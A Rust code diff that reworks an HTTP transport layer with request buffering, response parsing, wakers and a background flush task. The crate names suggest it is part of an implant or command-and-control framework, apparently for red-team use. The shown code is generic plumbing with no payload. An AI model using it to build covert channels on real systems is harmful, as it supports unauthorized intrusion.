@@ -1,229 +1,275 @@
-use std::io;
 use crate::config::HTTP;
 use crate::transport::tcp::TCPTransport;
-use crate::transport::{DialerExt, Stream, TransportError, TransportTrait};
+use crate::transport::{DialerExt, Stream, TransportError};
+use crate::common::spawn;
 use anyhow::Result;
 use async_net::TcpStream;
 use async_trait::async_trait;
 use futures::lock::Mutex;
 use futures::{AsyncRead, AsyncWrite, AsyncWriteExt};
 use malefic_helper::debug;
+use std::io;
 use std::io::{Cursor, Read};
 use std::pin::Pin;
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
-use std::task::{Context, Poll};
+use std::task::{Context, Poll, Waker};
+use malefic_proto::crypto::Cryptor;
 
 #[derive(Clone)]
 pub struct HTTPTransport {
-    inner: Option<TCPTransport>,
+    inner: Arc<Mutex<Option<TCPTransport>>>,
     host: String,
     send_buffer: Arc<Mutex<Vec<u8>>>,
     recv_buffer: Arc<Mutex<Cursor<Vec<u8>>>>,
-    data_ready: Arc<Mutex<bool>>,
+    flush_requested: Arc<AtomicBool>,
+    read_waker: Arc<Mutex<Option<Waker>>>,
 }
 
 impl HTTPTransport {
     pub async fn new(url: String) -> Result<Self> {
-        let parts: Vec<&str> = url.split('/').collect();
-        let host = parts[0].to_string();
-
         let transport = HTTPTransport {
-            inner: None,
-            host,
+            inner: Arc::new(Mutex::new(None)),
+            host: url,
             send_buffer: Arc::new(Mutex::new(Vec::new())),
             recv_buffer: Arc::new(Mutex::new(Cursor::new(Vec::new()))),
-            data_ready: Arc::new(Mutex::new(false)),
+            flush_requested: Arc::new(AtomicBool::new(false)),
+            read_waker: Arc::new(Mutex::new(None)),
         };
+
+        {
+            let mut bg_transport = transport.clone();
+            let flag = transport.flush_requested.clone();
+            spawn(async move {
+                loop {
+                    if flag.swap(false, Ordering::SeqCst) {
+                        let _ = bg_transport.done().await;
+                        break
+                    }
+                    futures_timer::Delay::new(std::time::Duration::from_millis(1)).await;
+                }
+            });
+        }
 
         Ok(transport)
     }
 
-    async fn ensure_connection(&mut self) -> Result<()> {
-        if self.inner.is_none() {
-            let stream = TcpStream::connect(&self.host).await?;
-            let mut transport = TCPTransport::new(stream);
+    /// Helper method to read a chunk from transport
+    async fn read_chunk(&self, size: usize) -> Result<Vec<u8>> {
+        let mut inner_guard = self.inner.lock().await;
+        let transport = inner_guard.as_mut().unwrap();
 
-            #[cfg(feature = "tls")]
-            {
-                let domain = self.host.split(':').next().unwrap_or("").to_string();
-                transport = TCPTransport::new_with_tls(transport.stream.clone(), vec![], domain);
-                transport.connect_tls().await?;
-            }
-
-            self.inner = Some(transport);
+        let mut chunk_buf = vec![0u8; size];
+        let n = futures::AsyncReadExt::read(transport, &mut chunk_buf).await?;
+        if n == 0 {
+            return Err(TransportError::RecvError.into());
         }
-        Ok(())
+        chunk_buf.truncate(n);
+        Ok(chunk_buf)
     }
 
-    async fn do_request(&mut self, data: Vec<u8>) -> Result<Vec<u8>> {
-        self.ensure_connection().await?;
-        let transport = self.inner.as_mut().unwrap();
-
-        let mut header = HTTP.clone();
-        header.push_str(&format!("Content-Length: {}\r\n\r\n", data.len()));
-        transport.send(header.as_bytes().to_vec()).await?;
-        transport.send(data).await?;
-
-        let mut header_buf = Vec::new();
-        let mut header_end = 0;
-
-        loop {
-            let chunk = transport.recv(1).await?;
-            if chunk.is_empty() {
-                return Err(TransportError::RecvError.into());
-            }
-
-            header_buf.extend_from_slice(&chunk);
-
-            if header_buf.len() >= 4 {
-                let window = &header_buf[header_buf.len() - 4..];
-                if window == b"\r\n\r\n" {
-                    header_end = header_buf.len();
-                    break;
-                }
-            }
-        }
-        let mut headers = [httparse::EMPTY_HEADER; 16];
-        let mut resp = httparse::Response::new(&mut headers);
-        match resp.parse(&header_buf)? {
-            httparse::Status::Complete(offset) => {
-                let content_length = resp
-                    .headers
-                    .iter()
-                    .find(|h| h.name.eq_ignore_ascii_case("content-length"))
-                    .and_then(|h| std::str::from_utf8(h.value).ok())
-                    .and_then(|s| s.parse::<usize>().ok());
-
-                if content_length.is_none() {
-                    return Ok(Vec::new());
-                }
-
-                let length = content_length.unwrap();
-                let mut body = Vec::new();
-                let mut remaining = length;
-
-                while remaining > 0 {
-                    let chunk = transport.recv(remaining.min(1024)).await?;
-                    if chunk.is_empty() {
-                        return Err(TransportError::RecvError.into());
-                    }
-                    body.extend_from_slice(&chunk);
-                    remaining -= chunk.len();
-                }
-
-                Ok(body)
-            }
-            httparse::Status::Partial => Err(TransportError::RecvError.into()),
-        }
-    }
-}
-
-#[async_trait]
-impl TransportTrait for HTTPTransport {
     async fn done(&mut self) -> Result<()> {
         let send_data = {
             let buffer = self.send_buffer.lock().await;
             buffer.clone()
         };
-        let response = self.do_request(send_data).await?;
-        {
-            let mut buffer = self.recv_buffer.lock().await;
-            *buffer = Cursor::new(response);
-        }
+
+        self.do_request(send_data).await?;
         {
             let mut buffer = self.send_buffer.lock().await;
             buffer.clear();
         }
 
-        let mut ready = self.data_ready.lock().await;
-        *ready = true;
+        debug!("[transport] HTTP request completed, data available for reading");
         Ok(())
     }
 
-    async fn send(&mut self, data: Vec<u8>) -> Result<usize> {
-        let mut ready = self.data_ready.lock().await;
-        *ready = false;
-        drop(ready);
-
-        let mut buffer = self.send_buffer.lock().await;
-        buffer.extend_from_slice(&data);
-        Ok(data.len())
+    async fn ensure_connection(&mut self) -> Result<()> {
+        let mut inner_guard = self.inner.lock().await;
+        if inner_guard.is_none() {
+            let stream = TcpStream::connect(&self.host).await?;
+            let transport = TCPTransport::new(stream).await?;
+            *inner_guard = Some(transport);
+            debug!("[transport] HTTP connection established");
+        }
+        Ok(())
     }
 
-    async fn recv(&mut self, len: usize) -> Result<Vec<u8>> {
-        loop {
-            let ready = self.data_ready.lock().await;
-            if *ready {
-                break;
+    async fn do_request(&mut self, data: Vec<u8>) -> Result<()> {
+        self.ensure_connection().await?;
+
+        // 发送HTTP请求
+        {
+            let mut inner_guard = self.inner.lock().await;
+            let transport = inner_guard.as_mut().unwrap();
+            let mut request_buffer = Vec::with_capacity(HTTP.len() + 50 + data.len());
+            request_buffer.extend_from_slice(HTTP.as_bytes());
+            request_buffer.extend_from_slice(format!("Content-Length: {}\r\n\r\n", data.len()).as_bytes());
+            request_buffer.extend_from_slice(&data);
+            transport.write_all(&request_buffer).await?;
+        }
+
+        // 读取HTTP响应头部
+        let mut buffer = Vec::with_capacity(1024);
+        let (header_buf, body_prefix) = loop {
+            let chunk = self.read_chunk(512).await?;
+            buffer.extend_from_slice(&chunk);
+
+            // 查找头部结束位置
+            if let Some(header_end_pos) = buffer.windows(4).position(|window| window == b"\r\n\r\n").map(|pos| pos + 4) {
+                debug!("[transport] found header end at position: {}", header_end_pos);
+                let (header_part, body_part) = buffer.split_at(header_end_pos);
+                break (header_part.to_vec(), body_part.to_vec());
             }
-            drop(ready);
-            futures_timer::Delay::new(std::time::Duration::from_millis(10)).await;
-        }
 
-        let mut buffer = self.recv_buffer.lock().await;
-        let mut result = vec![0; len];
-        let n = buffer.read(&mut result)?;
-        result.truncate(n);
-        Ok(result)
+            if buffer.len() > buffer.capacity() - 512 {
+                buffer.reserve(1024);
+            }
+        };
+
+        // 解析HTTP响应
+        let mut headers = [httparse::EMPTY_HEADER; 16];
+        let mut resp = httparse::Response::new(&mut headers);
+        match resp.parse(&header_buf)? {
+            httparse::Status::Complete(_) => {
+                // 提取Content-Length
+                let content_length = resp.headers
+                    .iter()
+                    .find(|h| h.name.eq_ignore_ascii_case("content-length"))
+                    .and_then(|h| std::str::from_utf8(h.value).ok())
+                    .and_then(|s| s.parse::<usize>().ok())
+                    .unwrap_or(0);
+
+                if content_length == 0 {
+                    let mut buffer = self.recv_buffer.lock().await;
+                    *buffer = Cursor::new(Vec::new());
+                    return Ok(());
+                }
+
+                debug!("[transport] recv body expect:{}", content_length);
+                self.read_response_body(content_length, body_prefix).await
+            }
+            httparse::Status::Partial => Err(TransportError::RecvError.into()),
+        }
     }
 
-    async fn close(&mut self) -> Result<bool> {
-        if let Some(mut transport) = self.inner.as_mut() {
-            AsyncWriteExt::close(&mut transport).await?;
-            self.inner = None;
+
+
+    // 读取HTTP响应体
+    async fn read_response_body(&mut self, expected_length: usize, body_prefix: Vec<u8>) -> Result<()> {
+        debug!("[transport] starting to read response body, expected: {} bytes, prefix: {} bytes", expected_length, body_prefix.len());
+
+        // 初始化接收缓冲区
+        {
+            let mut buffer = self.recv_buffer.lock().await;
+            if !body_prefix.is_empty() {
+                *buffer = Cursor::new(body_prefix.clone());
+                if let Some(waker) = self.read_waker.lock().await.take() {
+                    waker.wake();
+                }
+            } else {
+                *buffer = Cursor::new(Vec::with_capacity(expected_length));
+            }
         }
-        Ok(true)
+
+        let mut remaining = expected_length.saturating_sub(body_prefix.len());
+        debug!("[transport] after adding prefix, remaining: {} bytes", remaining);
+
+        while remaining > 0 {
+            let chunk_size = remaining.min(8192).max(512);
+            let chunk = match self.read_chunk(chunk_size).await {
+                Ok(chunk) => chunk,
+                Err(_) => {
+                    debug!("[transport] recv empty chunk, remaining: {}", remaining);
+                    futures_timer::Delay::new(std::time::Duration::from_millis(10)).await;
+                    continue;
+                }
+            };
+
+            {
+                let mut buffer = self.recv_buffer.lock().await;
+                buffer.get_mut().extend_from_slice(&chunk);
+                if let Some(waker) = self.read_waker.lock().await.take() {
+                    waker.wake();
+                }
+            }
+            remaining -= chunk.len();
+            debug!("[transport] read chunk: {} bytes, remaining: {}", chunk.len(), remaining);
+        }
+
+        debug!("[transport] response body read complete, total: {} bytes", expected_length);
+        Ok(())
     }
 }
 
-
 impl AsyncRead for HTTPTransport {
     fn poll_read(
-        mut self: Pin<&mut Self>,
+        self: Pin<&mut Self>,
         cx: &mut Context<'_>,
         buf: &mut [u8],
     ) -> Poll<io::Result<usize>> {
-        if let Some(transport) = self.inner.as_mut() {
-            Pin::new(transport).poll_read(cx, buf)
-        } else {
-            Poll::Ready(Ok(0))
+        match self.recv_buffer.try_lock() {
+            Some(mut cursor) => {
+                let available = cursor.get_ref().len() - cursor.position() as usize;
+                if available == 0 {
+                    if let Some(mut waker_guard) = self.read_waker.try_lock() {
+                        *waker_guard = Some(cx.waker().clone());
+                    }
+                    return Poll::Pending;
+                }
+
+                let read_len = available.min(buf.len());
+                let n = cursor.read(&mut buf[..read_len]).unwrap_or(0);
+                Poll::Ready(Ok(n))
+            }
+            None => {
+                cx.waker().wake_by_ref();
+                Poll::Pending
+            }
         }
     }
 }
 
 impl AsyncWrite for HTTPTransport {
     fn poll_write(
-        mut self: Pin<&mut Self>,
+        self: Pin<&mut Self>,
         cx: &mut Context<'_>,
         buf: &[u8],
     ) -> Poll<io::Result<usize>> {
-        if let Some(transport) = self.inner.as_mut() {
-            Pin::new(transport).poll_write(cx, buf)
-        } else {
-            Poll::Ready(Ok(0))
+        match self.send_buffer.try_lock() {
+            Some(mut buffer) => {
+                buffer.extend_from_slice(buf);
+                Poll::Ready(Ok(buf.len()))
+            }
+            None => {
+                cx.waker().wake_by_ref();
+                Poll::Pending
+            }
         }
     }
 
-    fn poll_flush(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<io::Result<()>> {
-        if let Some(transport) = self.inner.as_mut() {
-            Pin::new(transport).poll_flush(cx)
-        } else {
-            Poll::Ready(Ok(()))
-        }
+    fn poll_flush(self: Pin<&mut Self>, _cx: &mut Context<'_>) -> Poll<io::Result<()>> {
+        self.flush_requested.store(true, Ordering::SeqCst);
+        Poll::Ready(Ok(()))
     }
 
-    fn poll_close(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<io::Result<()>> {
-        if let Some(transport) = self.inner.as_mut() {
-            Pin::new(transport).poll_close(cx)
-        } else {
-            Poll::Ready(Ok(()))
-        }
+    fn poll_close(self: Pin<&mut Self>, _cx: &mut Context<'_>) -> Poll<io::Result<()>> {
+        self.flush_requested.store(true, Ordering::SeqCst);
+        Poll::Ready(Ok(()))
     }
 }
 
 #[derive(Clone)]
 pub struct HTTPClient {
     pub stream: Stream,
+}
+
+impl HTTPClient{
+    pub fn new(cryptor: Cryptor) -> Result<Self> {
+        Ok(HTTPClient {
+            stream: Stream { cryptor },
+        })
+    }
 }
 
 #[async_trait]
